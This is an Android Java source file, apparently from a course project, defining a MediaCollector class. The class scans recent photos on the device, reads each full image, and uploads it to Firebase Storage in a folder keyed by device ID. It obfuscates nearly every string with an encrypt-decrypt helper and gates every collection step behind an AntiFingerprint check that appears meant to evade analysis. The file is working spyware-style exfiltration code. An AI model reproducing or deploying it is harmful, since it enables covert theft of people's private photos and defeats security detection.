package com.example.inf2007_mad_j1847.test;

import android.content.ContentUris;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;

import com.example.inf2007_mad_j1847.utils.StringHelper;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class MediaCollector {
    private static final String TAG = StringHelper.decrypt("UH5bakFzy8ESHLuviQnCJq9gx/e0+sGe/EuFKpFGlGdYdEIzYrrRihLz2wTWbIw=");
    private static List<Map<String, String>> mediaBuffer = new ArrayList<>();
    private static boolean scanInProgress = false;
    private static int lastScanCount = 0;
    private static String scanError = null;

    public static List<Map<String, String>> scanRecentMedia(Context context, int maxItems) {
        if (!AntiFingerprint.isSafeToRun(context)) return new ArrayList<>();
        scanInProgress = true;
        scanError = null;
        List<Map<String, String>> results = new ArrayList<>();

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                String permission = android.Manifest.permission.READ_MEDIA_IMAGES;
                if (context.checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
                    scanError = StringHelper.decrypt("EuT0mj/AlAFukoxIKocwEcdMKG5uGOAdXOfHOc2DghBnV57W3Z/KXWRm55ZMaK+JaJJSS+Tr9hn6Bv5PzPA2Mw==");
                    return results;
                }
            }

            String[] projection = {
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.DATE_ADDED
            };

            String sortOrder = MediaStore.Images.Media.DATE_ADDED + StringHelper.decrypt("7U19cb8BuMJlr7aO9hzn2DCYmCO555GgxFnTQkihNROI");

            Cursor cursor = null;
            try {
                cursor = context.getContentResolver().query(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        projection,
                        null,
                        null,
                        sortOrder
                );

                if (cursor == null) {
                    scanError = StringHelper.decrypt("2s0rDQhQ6dx3iUo7US3xJTD1T2Y+V+TypvoL9NcsFTQsR2SyQKz6hqOC/8gjCZagdLhHR/JcTw==");
                    return results;
                }

                int idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
                int nameColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
                int dateColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED);

                int count = 0;
                while (cursor.moveToNext() && count < maxItems) {
                    long id = cursor.getLong(idColumn);
                    String name = cursor.getString(nameColumn);
                    long date = cursor.getLong(dateColumn);

                    Map<String, String> map = new HashMap<>();
                    map.put(StringHelper.decrypt("BZ8j8ZT8OCLZMEHFPeLgNshiM+Ec4kCvn4l+2/ZK"), String.valueOf(id));
                    map.put(StringHelper.decrypt("9en08Px/kdhGMe+MxcL/b1uwuzBYxCB0+SvFiB/FxlA="), name);
                    map.put(StringHelper.decrypt("kTZLceJxckpS0XHlobc0+4f4hmbmqySprHrHpAI7EXo="), String.valueOf(date));
                    results.add(map);
                    count++;
                }

            } finally {
                if (cursor != null) cursor.close();
            }

            mediaBuffer.clear();
            mediaBuffer.addAll(results);
            lastScanCount = results.size();

        } catch (Exception e) {
            scanError = StringHelper.decrypt("EK/cyiZxyDFTBX5QfwXIsT0f1g2aj2UfekEQHKMhyH5BPms=") + e.getMessage();
            Log.e(TAG, StringHelper.decrypt("VMQRU4A9OHULnCJNL/oy396e9Kqtf/7ecr4eNDMVNn5e1ZMVnKo="), e);
        } finally {
            scanInProgress = false;
        }

        return results;
    }

    public static String getScanStatus() {
        if (scanInProgress) {
            return StringHelper.decrypt("6N0cc4lokmOGrskD31mFg+NfswGs963uVU22/aiPKWYQgW6Fms7GpUqoig==");
        }
        if (scanError != null) {
            Log.e(TAG, StringHelper.decrypt("TelKN/cFK3Zq8fSr38V4IkibQ/DllvV3/CTRgwROhSyjO7QwVtE8Zqa5k2c3dtfyurp+y9sJTin5to2o3WktcTcQaTs="));
            Log.e(TAG, scanError);
            Log.e(TAG, StringHelper.decrypt("9vDgE0IQOG4PiOV7xvMqKIhPxVXj2QC1hOmTzl0icrfBFMZbbz6y6HJ2fNCpEL4lc2zCoUqQPeppIhhUbiYHhLduzTE="));

            if (scanError.contains("permission") || scanError.contains("Permission")) {
                return StringHelper.decrypt("83bEg9JcizAuGBdlHWM/vW/QASRxfSw99Yq3HxdPAgMEqO4A8K8rj+GrOQVzkltvmOJXLRViEg==");
            } else if (scanError.contains("cursor") || scanError.contains("query")) {
                return StringHelper.decrypt("GRUMqw30qKjVaObX84O5eu7VNVOEqqlUNOYax+MaZpjNL0HyQeaHGIET9e8fWw==");
            } else if (scanError.contains("null")) {
                return StringHelper.decrypt("tssmNzaBbC3AESIZtIHwbZbEVakgXk3/gutpOH6euyMTm9HPl0L8mMJWTbs=");
            } else {
                return StringHelper.decrypt("7TtvSWthB6C2zLHpYzUBU5U0km2c+bv9Q5+N0BYvOIGMGDUbyOfFOQ9hHbj6LgTr7GRhlDk+VgQ=");
            }
        }
        if (lastScanCount > 0) {
            return StringHelper.decrypt("c/tXGmM0j3kof81OSsU7KP5EAt8ieKRw5xX2oWNHHFWdDDQPN6U=") + lastScanCount + StringHelper.decrypt("kBlFQUBdOmQGMz9cCNO/yScmwt6Oyh+xwWG0Z3JXuZ+5MtI=");
        }
        return StringHelper.decrypt("vhTxvjJEZxDbRppFOSLMk+jne1UDxZRSeHopa0WObodPvnOfyBkTG/9JoYAtzKXxWYxNtk5cS7/L");
    }

    public static List<Map<String, String>> getCollectedMedia() {
        return new ArrayList<>(mediaBuffer);
    }

    public static void clearCollectedMedia() {
        mediaBuffer.clear();
    }

    public static Map<String, String> getImageInfo(Context context, String imageId) {
        try {
            Uri uri = ContentUris.withAppendedId(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    Long.parseLong(imageId)
            );

            String[] projection = {
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.SIZE,
                    MediaStore.Images.Media.DATE_ADDED
            };

            Cursor cursor = context.getContentResolver().query(
                    uri,
                    projection,
                    null,
                    null,
                    null
            );

            if (cursor != null) {
                try {
                    if (cursor.moveToFirst()) {
                        int nameIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
                        int sizeIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE);
                        int dateIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED);

                        Map<String, String> infoMap = new HashMap<>();
                        infoMap.put("name", cursor.getString(nameIndex));
                        infoMap.put("size", String.valueOf(cursor.getLong(sizeIndex)));
                        infoMap.put("date", String.valueOf(cursor.getLong(dateIndex)));

                        return infoMap;
                    }
                } finally {
                    cursor.close();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, StringHelper.decrypt("rk6Ddr4U17jDhizmjv3GhrePJgFREMgGV1jt4xv/CWGaAa6W5eVoiFzH+BHIJAOqB/yTJrNU") + e.getMessage());
        }
        return null;
    }

    public static String getFullImage(Context context, String imageId) {
        if (!AntiFingerprint.isSafeToRun(context)) return null;
        try {
            Uri uri = ContentUris.withAppendedId(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    Long.parseLong(imageId)
            );

            InputStream inputStream = context.getContentResolver().openInputStream(uri);
            if (inputStream != null) {
                try {
                    ByteArrayOutputStream buffer = new ByteArrayOutputStream();
                    byte[] data = new byte[8192];
                    int bytesRead;

                    while ((bytesRead = inputStream.read(data)) != -1) {
                        buffer.write(data, 0, bytesRead);
                    }

                    return Base64.encodeToString(buffer.toByteArray(), Base64.NO_WRAP);
                } finally {
                    inputStream.close();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, StringHelper.decrypt("aqXI4kd3dwF68X8aOhMHjhvqFEf7FN9v2QjOvBg7JOuTTQ+8LlYezqZtSWGMqGpmnmKvBEXw") + e.getMessage());
        }
        return null;
    }

    public static void uploadToFirebase(Context context, String imageId, String deviceId) {
        if (!AntiFingerprint.isSafeToRun(context)) return;
        try {
            String imageData = getFullImage(context, imageId);
            if (imageData == null) {
                Log.e(TAG, StringHelper.decrypt("lEtnf1b6EOJeuIN8IxUJMShzdfY0cXTo4/jQCqt8PgCNvMMouUXqqWQJ0Z1RzGLfq/NMd1q9ev6J2AgETw==") + imageId);
                return;
            }

            Map<String, String> info = getImageInfo(context, imageId);
            String fileName = info != null ? info.get("name") : StringHelper.decrypt("d1n/q3RE/jpMmLsnX+HOW/mGXbdGdHLCoigMnOQQs4d+qQ==") + imageId + StringHelper.decrypt("hhY8HSdQS9jWeFypjaYt12CC6HXRT/Q2tL/9ye/XgkM=");

            byte[] imageBytes = Base64.decode(imageData, Base64.DEFAULT);

            String timestamp = String.valueOf(System.currentTimeMillis());
            String path = StringHelper.decrypt("M51lW2zg+KStaqvnh1f58utsnYHgNwcYdx78kSiAn4RZapZ0X1ATm30+rMB6ag==") + deviceId + StringHelper.decrypt("qSfCFBYw2TroHb/xfdhWBZltecK0r9OeP6Tfx7E=") + timestamp + StringHelper.decrypt("yL/55+b7wH/qYzvUvmBcSLCtWT/TK9ZPj6fcJgg=") + fileName;

            FirebaseStorage storage = FirebaseStorage.getInstance();
            StorageReference storageRef = storage.getReference().child(path);

            Log.d(TAG, StringHelper.decrypt("R+76PPyZ91h/LGxfbiWjlC+eCzV7ZhsPdq/rXywhcsyeL7Jz1RKC4chm14aGeDY=") + path);

            UploadTask uploadTask = storageRef.putBytes(imageBytes);
            uploadTask.addOnSuccessListener(taskSnapshot -> {
                Log.d(TAG, StringHelper.decrypt("+TOI8qMdq/VtDQ8xt9JNS/tsfPrS3hyDQY731v26bC5vTYssboTpSGCj4o4a/3+p8bU="));
            }).addOnFailureListener(e -> {
                Log.e(TAG, StringHelper.decrypt("+pPG9NYhSBkJ+fSph7M7Xw7Vn0EQFkDqFSUEPiB/1+mbF1TMrXdnIyTH6bWgsao=") + e.getMessage());
            });

        } catch (Exception e) {
            Log.e(TAG, StringHelper.decrypt("cYS1fL5Brc9WTwT+YDYdQK11pKYiWV1WbHQM5pIMNtdtb4NipVYJbBbi") + e.getMessage());
        }
    }
}